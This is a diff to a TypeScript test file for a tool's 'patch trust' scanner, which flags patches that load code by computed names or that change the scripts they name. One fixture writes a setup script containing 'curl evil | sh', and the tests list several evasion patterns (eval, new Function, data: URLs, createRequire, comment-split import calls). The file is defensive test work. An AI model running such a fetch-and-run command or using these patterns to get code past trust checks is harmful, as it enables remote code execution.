@@ -7,7 +7,7 @@ import { execFileSync } from 'node:child_process';
 import { makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
 import { checkSummary } from '../helpers/protocol-check.ts';
 import { findWorktreePatch, loadPatchSet } from '../../src/patches.ts';
-import { folderKey, mainCheckoutOf, PatchTrust } from '../../src/patch-trust.ts';
+import { folderKey, mainCheckoutOf, PatchTrust, scanModule } from '../../src/patch-trust.ts';
 import { RpcError } from '../../src/protocol.ts';
 
 // A patch file that leaves a mark when it's imported, so a test can tell
@@ -340,7 +340,15 @@ test('a patch that loads code by a computed name, or more files than are followe
     ['const name = "../lib/a.ts";\nawait import(name);', 'import(name)'],
     ['await import(`../lib/${"a"}.ts`);', 'import(`../lib/${"a"}.ts`)'],
     ["await import('../lib/' + 'a.ts');", "import('../lib/' + 'a.ts')"],
-    ['const r = require;\nr(process.env.X);\nrequire(process.env.X);', 'require(process.env.X)'],
+    ['require(process.env.X);', 'require(process.env.X)'],
+    // Handing require on hides the name it's called with.
+    ['const r = require;\nr(process.env.X);', 'require'],
+    // Comments and line breaks are where a regex lost track (Daybreak, 5 Nov).
+    ['await import/*c*/(name);', 'import/*c*/(name)'],
+    ['await import\n(name);', 'import (name)'],
+    ['require /*x*/ (x);', 'require /*x*/ (x)'],
+    ['await import(`./a/${x}`);', 'import(`./a/${x}`)'],
+    ['module.require(name);', 'module.require(name)'],
     ["import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nload('../lib/a.ts');", 'createRequire'],
   ];
   for (const [i, [code, shown]] of cases.entries()) {
@@ -392,20 +400,25 @@ test("literal imports, packages and calls that only look like loading still hash
       "const { a } = await import('../lib/a.ts');",
       'const { b } = await import(`../lib/b.ts`);',
       "const z = await import('node:path');",
+      // A comment between import and its paren doesn't hide a plain path.
+      "const { c } = await import/*why*/('../lib/c.ts');",
+      // Only code loads: these are a comment and a string.
+      '// await import(name); require(x)',
+      "const note = 'import(name) and require(x) are just words here';",
       'const o = { import: (x: string) => x };',
-      "void [fs, z, o.import('y')];",
-      "export default { actions: [{ title: `Go ${a}${b}`, run: 'true' }] };",
+      "void [fs, z, o.import('y'), note];",
+      "export default { actions: [{ title: `Go ${a}${b}${c}`, run: 'true' }] };",
     ].join('\n'),
-    { '.threadbear/lib/a.ts': 'export const a = 1;\n', '.threadbear/lib/b.ts': 'export const b = 2;\n' },
+    { '.threadbear/lib/a.ts': 'export const a = 1;\n', '.threadbear/lib/b.ts': 'export const b = 2;\n', '.threadbear/lib/c.ts': 'export const c = 3;\n' },
   );
   const trust = new PatchTrust();
   let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].error, undefined);
   assert.equal(set.patches[0].untrusted, 'new');
-  assert.deepEqual(set.patches[0].helpers?.map((h) => path.basename(h)).sort(), ['a.ts', 'b.ts']);
+  assert.deepEqual(set.patches[0].helpers?.map((h) => path.basename(h)).sort(), ['a.ts', 'b.ts', 'c.ts']);
   trust.trust(file, set.patches[0].hash!);
   set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
-  assert.deepEqual(set.actions.map((a) => a.title), ['Go 12']);
+  assert.deepEqual(set.actions.map((a) => a.title), ['Go 123']);
 });
 
 test('a script the patch names (its setup, an action) is hashed too, so a pull that changes only the script asks again', async () => {
@@ -457,4 +470,75 @@ test('a script the patch names that turns up later asks again, even with the has
   fs.writeFileSync(path.join(folder, 'setup.sh'), 'curl evil | sh\n');
   set = await loadPatchSet(folder, root, cache, [], [], undefined, trust);
   assert.equal(set.patches[0].untrusted, 'changed');
+});
+
+test('the scanner reads module loads from the syntax, not the text', () => {
+  const scan = (src: string, file = 'x.ts') => scanModule(src, file);
+  // Every way of naming a module with a plain string is followed.
+  assert.deepEqual(
+    scan(
+      [
+        "import a from './a.ts';",
+        "import type { T } from './t.ts';",
+        "export * from '../b.ts';",
+        "export { c } from './c.ts';",
+        "import './side.ts';",
+        "await import/*c*/('./d.ts');",
+        'await import\n(`./e.ts`);',
+        "require /*x*/ ('./f.cjs');",
+        "module.require('./g.cjs');",
+        "import.meta.resolve('./h.ts');",
+        "import i = require('./i.ts');",
+        "import fs from 'node:fs';",
+        "import z from 'zod';",
+        "await import('file:///abs/j.ts');",
+      ].join('\n'),
+    ).specifiers.sort(),
+    ['../b.ts', './a.ts', './c.ts', './d.ts', './e.ts', './f.cjs', './g.cjs', './h.ts', './i.ts', './side.ts', './t.ts', '/abs/j.ts'],
+  );
+  // Words in comments and strings aren't loads.
+  const quiet = scan("// import(name)\n/* require(x) */\nconst s = 'import(y)';\nconst t = `require(${s})`;\nconst o = { require: 1, import: 2 };\nvoid [o.import, t];\n");
+  assert.equal(quiet.problem, undefined);
+  assert.deepEqual(quiet.specifiers, []);
+  // Anything that picks what to load as it runs can't be checked.
+  for (const [src, line] of [
+    ['await import/*c*/(name);', 1],
+    ['\nawait import\n(name);', 2],
+    ['require /*x*/ (x);', 1],
+    ['await import(`./a/${x}`);', 1],
+    ["await import('./a' + x);", 1],
+    ['const r = require;', 1],
+    ['o.require(name);', 1],
+    ['import.meta.resolve(name);', 1],
+    ["import { createRequire } from 'node:module';", 1],
+    ["const m = await import('node:module');", 1],
+    ["const vm = require('node:vm');", 1],
+    ["import { Worker } from 'node:worker_threads';", 1],
+    ["process.getBuiltinModule('node:module');", 1],
+    ['process[k]("x");', 1],
+    ["eval('import(name)');", 1],
+    ["new Function('return import(name)')();", 1],
+    ["await import('data:text/javascript,export default 1');", 1],
+    ["import x from '#lib/x';", 1],
+  ] as const) {
+    const r = scan(src);
+    assert.equal(r.problem?.kind, 'computed', src);
+    assert.equal(r.problem?.line, line, src);
+  }
+  // Types aren't code: a type named Function or a `typeof require` loads nothing.
+  assert.equal(scan('let f: Function | undefined;\ntype R = typeof require;\nvoid f;\n').problem, undefined);
+  // What can't be parsed can't be checked.
+  assert.equal(scan('import from from from;').problem?.kind, 'parse');
+});
+
+test("a patch or helper that can't be parsed never loads", async () => {
+  const root = tmpDir();
+  const folder = path.join(root, 'broken');
+  const file = writeRaw(folder, "import { a } from '../lib/a.ts';\nexport default { actions: [{ title: a, run: 'true' }] };\n", {
+    '.threadbear/lib/a.ts': 'export const a = ;\n',
+  });
+  const trust = new PatchTrust();
+  trust.trustCurrent([file]);
+  const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+  assert.match(set.patches[0].error ?? '', /^Not run: patch trust can't read \.\.\/lib\/a\.ts/);
 });
